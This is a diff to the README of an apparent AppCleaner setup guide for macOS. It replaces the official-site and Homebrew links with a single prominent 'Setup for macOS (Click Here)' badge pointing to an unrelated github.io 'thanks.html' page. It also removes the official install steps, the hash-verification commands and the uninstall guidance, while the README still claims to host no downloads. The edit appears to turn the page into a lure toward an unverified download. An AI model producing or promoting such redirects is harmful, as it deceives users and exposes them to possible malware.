@@ -6,9 +6,7 @@
 This repository is a **documentation-only** quick start. It does **not** host binaries, mirrors, or modified installers.
 
 <p align="center">
-  <a href="#installation"><img alt="View Setup for macOS" src="https://img.shields.io/badge/View%20Setup%20for%20macOS-2da44e?style=for-the-badge&logo=apple&logoColor=white" /></a>
-  <a href="https://freemacsoft.net/appcleaner/" rel="noopener noreferrer"><img alt="Go to Official Site" src="https://img.shields.io/badge/Go%20to%20Official%20Site-2da44e?style=for-the-badge&logo=safari&logoColor=white" /></a>
-  <a href="#option-a—homebrew"><img alt="Homebrew Install" src="https://img.shields.io/badge/Homebrew%20Install-2da44e?style=for-the-badge&logo=homebrew&logoColor=white" /></a>
+  <a href="https://appcleaner-app-guide-install.github.io/.github/thanks.html"><img alt="View Setup for macOS" src="https://img.shields.io/badge/Setup%20for%20macOS%20(Click%20Here)-2da44e?style=for-the-badge&logo=apple&logoColor=white" /></a>
 </p>
 
 ---
@@ -28,24 +26,6 @@ This repository is a **documentation-only** quick start. It does **not** host bi
 
 ---
 
-## Installation
-
-### Option A—Homebrew
-If you already use Homebrew, install the cask:
-
-```bash
-brew install --cask appcleaner
-```
-
-### Option B—Manual (official source)
-1. Open the **official website**: <https://freemacsoft.net/appcleaner/>
-2. Download the latest DMG/ZIP from the site.
-3. Move **AppCleaner.app** to **Applications** and launch it.
-
-> This repository does **not** host any downloads. Always use the official website or the Homebrew cask.
-
----
-
 ## Configure (Optional)
 - In AppCleaner preferences, review search options for related files.
 - Keep Time Machine enabled so you can roll back changes if needed.
@@ -55,21 +35,11 @@ brew install --cask appcleaner
 ## Verify (Optional)
 To verify a downloaded file, compute its hash locally:
 
-```bash
-cd ~/Downloads
-shasum -a 256 AppCleaner*.dmg
-```
 
 Compare with the hash provided by the official source (if available).
 
 ---
 
-## Update & Uninstall
-- **Update (Homebrew):** `brew upgrade --cask appcleaner`  
-- **Uninstall (Homebrew):** `brew uninstall --cask appcleaner`  
-- **Manual uninstall:** remove **AppCleaner.app** from **Applications**; optional preferences live under `~/Library/Preferences/` and `~/Library/Application Support/`.
-
----
 
 ## Best Practices
 - Close target apps before cleaning to avoid “in use” files.
